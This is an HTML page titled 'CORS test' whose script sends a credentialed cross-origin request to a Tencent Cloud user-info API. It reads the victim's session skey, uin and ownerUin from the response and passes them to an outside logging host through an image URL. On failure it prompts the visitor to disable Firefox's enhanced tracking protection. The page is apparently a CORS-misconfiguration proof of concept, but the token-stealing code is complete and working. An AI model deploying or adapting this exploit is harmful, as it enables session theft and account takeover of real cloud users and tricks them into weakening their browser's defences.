<html>
  <head>
    <title>CORS测试</title>
  </head>
  <body>
    <script>
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "https://lcap.cloud.tencent.com/api/v1/passport/getUserInfo", true);
            xhr.withCredentials = true;
            xhr.setRequestHeader('Origin', 'https://lcap.cloud.tencent.com');
            xhr.onreadystatechange = function() {
                if (xhr.status == 200 && xhr.readyState == 4) {
                    var response = JSON.parse(xhr.responseText);
                    if (response.errcode === 0) {
                        document.getElementById("sendSkey").setAttribute("src", "http://gz89zua6.eyes.sh/?skey=" + response.data.skey + "&uin=" + response.data.uin + "&ownerUin=" + response.data.ownerUin);
                    } else {
                        alert("警告: 不兼容的请求");
                        if (window.navigator.appCodeName === "Mozilla") {
                            alert('提示: 请关闭Firefox的增强型保护模式以免出现不兼容问题！');
                        }
                    }
                }
            }
            xhr.send();
    </script>
  </body>
</html>
